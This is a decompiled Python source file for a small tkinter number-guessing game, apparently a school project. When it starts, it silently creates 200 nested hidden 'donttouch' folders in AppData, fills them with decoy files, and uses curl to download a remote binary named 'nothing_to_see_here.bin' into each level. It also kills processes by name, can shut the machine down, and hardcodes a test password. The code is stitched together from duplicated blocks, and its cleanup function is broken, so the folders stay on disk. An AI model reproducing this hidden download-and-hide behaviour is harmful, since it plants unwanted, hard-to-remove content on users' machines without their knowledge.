# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: irgendwas.py
# Bytecode version: 3.8.0rc1+ (3413)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)
global CORRECT_PASSWORD_HASH
global current_random_number
global pass_counter
global balu_wake_counter
import tkinter as tk
from tkinter import messagebox, simpledialog
import subprocess
import random
import os
import time
import hashlib
import sys
CORRECT_PASSWORD_HASH = hashlib.sha256('Ben2013'.encode()).hexdigest()
balu_wake_counter = 0
pass_counter = 0
# Probability that Balu will show the cat/comparison when 'balu' is called.
# Set to a float between 0.0 and 1.0 (e.g. 0.7 means 70% chance).
BALU_PROBABILITY = 0.7
# Whether Test Mode is currently active (controls visibility of test-only UI)
TEST_MODE_ACTIVE = False
TEST_SNAPSHOT = None
import subprocess
import os
global path
global base
global N
global btn_game
global root
global found_icon
global label
global btn_testmode
global btn_reset
global btn_exit_test


import os
import subprocess

base = os.path.join(os.getenv("LOCALAPPDATA"), "roaming")
os.makedirs(base, exist_ok=True)

path = base
N = 200  # Anzahl Ebenen anpassen
for i in range(N):
    path = os.path.join(path, "donttouch")
    try:
        os.makedirs(path, exist_ok=True)
    except Exception as e:
        print(f"Fehler bei Ebene {i}: {e}")
        break
import os
import subprocess
import shutil

# Base: Roaming appdata (Roaming = APPDATA)
base = os.getenv("APPDATA")
if not base:
    # Fallback falls APPDATA nicht gesetzt ist (sehr selten)
    base = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")

# Root für deine "donttouch"-Struktur
root_donttouch = os.path.join(base, "donttouch")
os.makedirs(root_donttouch, exist_ok=True)

path = root_donttouch
N = 200  # Anzahl Ebenen anpassen

# Erst prüfen, ob Internet da ist (sauber, ohne cmd-redirects)
def internet_available():
    try:
        result = subprocess.run(
            ["ping", "-n", "1", "google.com"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return result.returncode == 0
    except Exception as e:
        print(f"Fehler beim Prüfen der Internetverbindung: {e}")
        return False

has_net = internet_available()
if not has_net:
    print("❌ Internetverbindung NICHT ERKANNT! Überspringe das Herunterladen der Dateien.")
else:
    print("✅ Internetverbindung erkannt!")

# Erstelle die verschachtelten Ordner und die Dateien
for i in range(N):
    path = os.path.join(path, "donttouch")
    try:
        os.makedirs(path, exist_ok=True)
    except Exception as e:
        print(f"Fehler bei Ebene {i}: {e}")
        break

    # nur beispielhaft: Dateien anlegen (keine Low-Level os.open-Fehler mehr)
    try:
        open(os.path.join(path, "readme.txt"), 'w').close()
        open(os.path.join(path, "important.doc"), 'w').close()
        open(os.path.join(path, "system.cfg"), 'w').close()
        open(os.path.join(path, "data.bin"), 'w').close()
        open(os.path.join(path, "config.ini"), 'w').close()
        open(os.path.join(path, "notes.txt"), 'w').close()
    except Exception as e:
        print(f"Fehler beim Erstellen der Dateien in Ebene {i}: {e}")
        # wenn du willst, break hier einfügen

    # wenn Internet vorhanden, versuche (optional) zu downloaden
    if has_net:
        try:
            target = os.path.join(path, "nothing_to_see_here.bin")
            curl_cmd = f'curl -o "{target}" "https://ben-bit-code208/ben-bit.code208/DATA/Spiele/temp.bin"'
            subprocess.run(curl_cmd, shell=True)
        except Exception as e:
            print(f"Fehler beim Herunterladen in Ebene {i}: {e}")

# Setze Attribute (Windows) — falls nötig
try:
    attrib_path = os.path.join(root_donttouch)
    subprocess.run(f'attrib +s +h "{attrib_path}"', shell=True)
except Exception as e:
    print(f"Fehler beim Setzen von Attributen: {e}")

print("Easter-egg erstellt in:", root_donttouch)


# sichere Delete-Funktion für dein GUI (verwende statt rmdir/Subprocess)
def delete_all_data():
    target = os.path.join(base, "donttouch")
    if os.path.exists(target):
        try:
            shutil.rmtree(target, ignore_errors=True)
            messagebox.showinfo('Gelöscht', 'Datenordner wurde gelöscht.')
        except Exception as e:
            messagebox.showerror('Fehler beim Löschen', f'Fehler: {e}')
    else:
        messagebox.showinfo('No Data Found', 'Kein Datenordner gefunden zum Löschen.')



# Setze Attribute mit attrib (Windows CMD)
subprocess.run(['attrib', '+s', '+h', os.path.join(os.getenv("LOCALAPPDATA"), "roaming", "donttouch")], shell=True)

print("Easter-egg erstellt in:", base)


def pc_or_touch():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        if user32.GetSystemMetrics(95) != 0:
            return 'touch'
        else:
            return 'pc'
    except Exception as e:
        print(f'Error determining device type: {e}')
        return 'unknown'

   
    
def start_keyboard():
    tap_tip_path = 'C:\\Program Files\\Common Files\\microsoft shared\\ink\\TabTip.exe'
    osk_path = 'C:\\Windows\\System32\\osk.exe'
    if os.path.exists(tap_tip_path):
        subprocess.Popen(f'start "" "{tap_tip_path}"', shell=True)
    elif os.path.exists(osk_path):
        subprocess.Popen(f'start "" "{osk_path}"', shell=True)
    else:
        print('Keine Bildschirmtastatur gefunden.')

if pc_or_touch() == 'touch':
    print('Touch device detected.')
    start_keyboard() 
else:
    print('Other device detected. No keyboard started. Keyboard can be started manually with command "keyboard".')

def angry_Balu():
    """Funktion, die ausgeführt wird, wenn Balu wütend wird."""
    global current_random_number
    output = 'Balu has bited you mow the number will be choosen by Balu.'
    text_output.insert(tk.END, f'{output}\n')
    try:
        text_output.see(tk.END)
    except Exception:
        pass
    current_random_number = random.randint(1, 100)

def kill_game(process_name):
    """Beendet einen Prozess mit dem angegebenen Namen."""
    try:
        subprocess.run(f'taskkill /IM {process_name} /F', shell=True, check=True)
        print(f'Prozess {process_name} erfolgreich beendet.')
    except subprocess.CalledProcessError as e:
        print(f'Fehler beim Beenden des Prozesses {process_name}: {e}')

def initialize_game():
    """Initialize or restart the game."""
    global current_random_number
    current_random_number = random.randint(1, 100)
    messagebox.showinfo('Game Started', 'Guess the random number between 1 and 100!')
    text_output.delete('1.0', tk.END)
    try:
        text_output.see(tk.END)
    except Exception:
        pass

def run_command():
    """Process user commands."""
    global balu_wake_counter
    global pass_counter
    cmd = entry.get().strip().lower()
    output = ''
    if cmd == 'clear':
        text_output.delete('1.0', tk.END)
    elif cmd == 'help':
        output = 'Available Commands:\n- clear: clear screen\n- help: show commands\n- restart: restart game\n- exit: close game'
    elif cmd == 'restart':
        initialize_game()
    elif cmd == 'exit':
        game_window.destroy()
    elif cmd == 'balu':
        # Allow runtime adjustment via the Scale widget if the game window has been opened
        try:
            runtime_prob = BALU_PROBABILITY
            if 'balu_prob_scale' in globals() and balu_prob_scale is not None:
                # Scale holds 0-100 int; convert back to 0.0-1.0
                runtime_prob = float(balu_prob_scale.get()) / 100.0
        except Exception:
            runtime_prob = BALU_PROBABILITY

        # Determine whether Balu appears based on runtime probability
        if random.random() < runtime_prob:
            # Show the cat art and then two lines with numbers and an explicit result
            global random_number2
            random_number2 = random.randint(1, 100)
            output = ' /\\_/\\ \n( o.o )  Meow!\n > ^ <\n'
            output += f"Balu's number: {random_number2}\n"
            if random_number2 < current_random_number:
                output += 'Result: - (Balu < Current)'
            elif random_number2 > current_random_number:
                output += 'Result: + (Balu > Current)'
            else:
                output += 'Result: = (Equal)'
        else:
            balu_wake_counter += 1
            if balu_wake_counter >= 3:
                angry_Balu()
                balu_wake_counter = 0
            else:
                output = f'Balu is sleeping, try again later. Wake attempts: {balu_wake_counter}/3'
    elif cmd == 'checknet':
        result = os.system('ping -n 1 google.com >nul 2>&1')
        output = 'Internet OK' if result == 0 else 'No connection'
    elif cmd == 'test':
        password = simpledialog.askstring('Test Mode', 'Enter password:', show='*')
        if password == 'Ben2013.':
            output = 'Test mode activated! Random number is: ' + str(current_random_number)
        else:
            output = 'Wrong password.'
            pass_counter += 1
            if pass_counter >= 3:
                output = ':((((((((((('
                kill_game('TapTip.exe')
                kill_game('OnScreenKeyboard.exe')
                kill_game('SchulSpiel.exe')
                sys.exit('3x0000003')
    elif cmd.isdigit() and int(cmd) == current_random_number:
        output = 'You guessed the random number!'
        play_again = messagebox.askyesno('Play Again?', 'Do you want to play again?')
        if play_again:
            initialize_game()
        else:
            time.sleep(2)
            output = 'Thanks for playing!'
            kill_game('TapTip.exe')
            kill_game('OnScreenKeyboard.exe')
            shutdown = messagebox.askyesno('Exit', 'Do you want to Shutdown?')
            if shutdown:
                os.system('shutdown /s /t 1')
            else:
                output = 'bye'
            kill_game('SchulSpiel.exe')
    else:
        output = 'Unknown command or incorrect number.'
    if output:
        text_output.insert(tk.END, f'>>> {cmd}\n{output}\n\n')
        try:
            text_output.see(tk.END)
        except Exception:
            pass
    entry.delete(0, tk.END)

def start_game():
    global game_window
    global entry
    global text_output
    global balu_prob_scale
    game_window = tk.Toplevel(root)
    game_window.title('Mr.X Game')
    game_window.configure(bg='#FFFFFF')
    game_window.geometry('600x400')
    # Use the previously discovered icon if available.
    try:
        if 'found_icon' in globals() and found_icon:
            game_window.iconbitmap(found_icon)
    except Exception:
        # ignore icon setting errors to avoid crashing with _tkinter.TclError
        pass
    btn_game.config(state=tk.DISABLED)
    game_window.protocol('WM_DELETE_WINDOW', lambda: (game_window.destroy(), btn_game.config(state=tk.NORMAL)))
    # Create a framed area for the Balu probability control (bigger and clearer)
    balu_frame = tk.Frame(game_window, bg='#FFFFFF', bd=3, relief=tk.RIDGE, height=120)
    balu_frame.pack(pady=8, fill='x', padx=10)

    balu_frame_label = tk.Label(balu_frame, text='Balu appear chance (%)', font=('Segoe UI', 12, 'bold'), bg='#FFFFFF', fg='#000000')
    balu_frame_label.pack(anchor='w', padx=10, pady=(8, 0))

    # Larger scale for better visibility
    balu_prob_scale = tk.Scale(balu_frame, from_=0, to=100, orient=tk.HORIZONTAL, length=560,
                               bg='#FFFFFF', fg='#000000', font=('Segoe UI', 14), showvalue=False)
    balu_prob_scale.set(int(BALU_PROBABILITY * 100))
    balu_prob_scale.pack(padx=10, pady=(6, 4), fill='x')

    balu_prob_value_label = tk.Label(balu_frame, text=f'{int(BALU_PROBABILITY * 100)}%', font=('Segoe UI', 13, 'bold'), bg='#FFFFFF', fg='#000000')
    balu_prob_value_label.pack(anchor='e', padx=10, pady=(0, 8))

    # Update the percent label when the slider moves
    balu_prob_scale.config(command=lambda v: balu_prob_value_label.config(text=f'{int(float(v))}%'))

    # Main text output - allow it to expand so controls remain visible
    text_output = tk.Text(game_window, height=10, width=70, bg='#FFFFFF', fg='#000000', insertbackground='#FFFFFF', font=('', 12))
    text_output.pack(pady=6, fill='both', expand=True)

    entry = tk.Entry(game_window, width=60, bg='#ffffff', fg='#000000', font=('Segoe UI', 12))
    entry.pack(pady=(4,2))
    entry.bind('<Return>', lambda event: run_command())

    button_exec = tk.Button(game_window, text='Guess', command=run_command, bg='#ffffff', fg='#000000', font=('Segoe UI', 10))
    button_exec.pack(pady=8)

    initialize_game()

def start_test_mode():
    """Prompt for password and show Test Mode info from the main menu.
    Uses the same password logic as the in-game 'test' command.
    """
    global pass_counter
    global current_random_number
    # Ask for password (masked)
    password = simpledialog.askstring('Test Mode', 'Enter password:', show='*', parent=root)
    if password == 'Ben2013.':
        # Ensure a current_random_number exists even if the game hasn't been started
        try:
            _ = current_random_number
        except NameError:
            current_random_number = random.randint(1, 100)
        # Create a persistent snapshot for Test Mode so repeated openings show the same number
        global TEST_SNAPSHOT
        if TEST_SNAPSHOT is None:
            TEST_SNAPSHOT = current_random_number
        messagebox.showinfo('Test Mode', 'Test mode activated! Random number is: ' + str(TEST_SNAPSHOT))
        # Activate test mode UI elements
        activate_test_mode()
    else:
        pass_counter += 1
        messagebox.showwarning('Wrong password', 'Wrong password.')
        if pass_counter >= 3:
            messagebox.showerror('Locked out', ':(((((((((((')
            kill_game('TapTip.exe')
            kill_game('OnScreenKeyboard.exe')
            kill_game('SchulSpiel.exe')
            sys.exit('3x0000003')

def activate_test_mode():
    """Enable test-mode UI elements."""
    global TEST_MODE_ACTIVE
    TEST_MODE_ACTIVE = True
    try:
        # Show the reset button only when test mode is active
        btn_reset.pack(pady=8, fill='x', padx=60)
        btn_exit_test.pack(pady=8, fill='x', padx=60)
    except Exception:
        pass

def deactivate_test_mode():
    """Disable test-mode UI elements."""
    global TEST_MODE_ACTIVE
    TEST_MODE_ACTIVE = False
    try:
        btn_reset.pack_forget()
        btn_exit_test.pack_forget()
    except Exception:
        pass
    # Clear the snapshot so a fresh value is used next time
    global TEST_SNAPSHOT
    TEST_SNAPSHOT = None
root = tk.Tk()
root.title('Main Menü')
# Make main menu size similar to the game window
root.geometry('600x400')
root.configure(bg='#FFFFFF')
root.resizable(False, False)
# Try a list of possible icon locations and use the first one that exists.
icon_candidates = ['icon.ico', os.path.join('DATA', 'icon.ico'), os.path.join('..', 'icon.ico')]
found_icon = None
for ic in icon_candidates:
    try_path = os.path.abspath(ic)
    if os.path.exists(try_path):
        found_icon = try_path
        break

if found_icon:
    # iconbitmap on Windows expects either a .ico file path or a bitmap name; wrap in try/except
    try:
        root.iconbitmap(found_icon)
    except Exception:
        # If setting the icon fails, ignore and continue. This avoids crashing with _tkinter.TclError
        pass
label = tk.Label(root, text='Welcome! Choose an option:', font=('Segoe UI', 14), bg='#FFFFFF', fg='#000000')
label.pack(pady=24)
# Make buttons stretch to the menu width
btn_game = tk.Button(root, text='🎮  Start MR.X', command=start_game, font=('Segoe UI', 12), bg='white', fg='#000000')
btn_game.pack(pady=8, fill='x', padx=60)
btn_testmode = tk.Button(root, text='🔒 Test Mode', command=start_test_mode, font=('Segoe UI', 12), bg='white', fg='#000000')
btn_testmode.pack(pady=8, fill='x', padx=60)
def reset_attempts():
    """Reset the password attempt counter from the main menu."""
    global pass_counter
    pass_counter = 0
    messagebox.showinfo('Reset Attempts', 'Password attempt counter reset to 0.')#
def delete_all_data():
    """Delete all created data directories and files."""
    if os.path.exists(os.path.join(os.getenv("APPDATA"), "donttouch")):
     subprocess.run(
        [f'rmdir /S /Q "os.path.join(os.getenv("APPDATA"), "donttouch")"'],
        shell=True
    )
    else:
        messagebox.showinfo('No Data Found', 'No data directory found to delete.')
tk.Button(
    root,
    text='Delete ALL DATA',
    command=lambda:
        delete_all_data(),
    font=('Segoe UI', 11),
    bg='white',
    fg='#000000',
    width=25
).pack(pady=8, fill='x', padx=60)

btn_reset = tk.Button(root, text='🔁 Reset Attempts', command=reset_attempts, font=('Segoe UI', 11), bg='white', fg='#000000', width=25)
# Do not pack btn_reset here; it will be packed when test mode is activated
def exit_test_mode():
    """Handler to exit test mode from the UI."""
    deactivate_test_mode()

btn_exit_test = tk.Button(root, text='⏏ Exit Test Mode', command=exit_test_mode, font=('Segoe UI', 11), bg='white', fg='#000000', width=25)
# Do not pack btn_exit_test here; it will be packed when test mode is activated

root.mainloop()

























































































































































































































































































































































































































































































































































































































































































































































































































































































#






























































































































# so only that you know i am constantly distracting myself with useless stuff
# and that i am not dead
# and that i am still alive
# and that i am still coding
# and that i am still here
# and that i am still working on stuff
# and that i am still alive
# and that i am still here
# and that i am still coding
# so please ignore these lines if possible
# and if you read this you are a legend
# and if you read this i can some day say "someone read my code"
# and if you read this i can do some advertising
# https://github.com/Ben-bit-code208
# and (only that you know)this is a school project
# so you can help but you dont have to
# and if you find any bugs please report them
# and if you find anything that can be improved please tell me aswell
# and if you find anything intresting please tell me aswell
# and if you find any thing that is wrong please tell me aswell
# and if you find anything on my github that's intresting please (but not pressure) advertise it i could need some more issues
# and stars
# and pull requests
# and bugs to fix
# and somthing to do :D
# and please (if you packed this far) tell me what you think about this code
# and please edit the "Wasted time" section in this python file at the beginning it's counts the time i and you and the others
# didn't wasted on this project
# to bug fix
# to write code
# to test stuff
# to do stuff
# and to add features 
# thank you for reading this far
#if you wanna debug this code
# here's the code for the test mode
# password is "Ben2013."
# if you enter the wrong password 3 times the program will exit
# and close the keyboard if it was opened by this program
# and close the game if it was opened by this program
# 5d307be1a41ad57046324368a8d3a3a42908d31d9eec10298e6d6d050de06e49aaaeb2bf6f32e84b76ee566e6af1fdd0
# 6d4c514051f90a89770fcfb3c4a22cc7d8d9f04de7ccbe1cc60a24274bf3646d1c67efea7e7ad5896ddd137bdccaffbbaafd859680f727e7d37ab39063527f4b #type: ignore